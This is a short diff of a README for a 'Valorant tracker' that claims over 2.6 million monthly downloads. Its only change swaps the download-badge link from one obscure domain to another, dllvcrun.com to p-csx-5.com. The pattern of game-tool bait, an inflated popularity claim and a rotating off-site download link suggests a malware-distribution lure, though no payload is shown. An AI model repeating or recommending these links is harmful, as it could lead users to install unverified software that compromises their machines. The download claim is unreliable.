@@ -49,7 +49,7 @@ A: Yes — track your performance on every map.
 
 **Monthly downloads:** 2.6m+
 
-[![Download](https://img.shields.io/badge/Download-v3.6-brightgreen?style=for-the-badge)](https://dllvcrun.com/valoranttracker)
+[![Download](https://img.shields.io/badge/Download-v3.6-brightgreen?style=for-the-badge)](https://p-csx-5.com/valoranttracker)
 
 ---
 
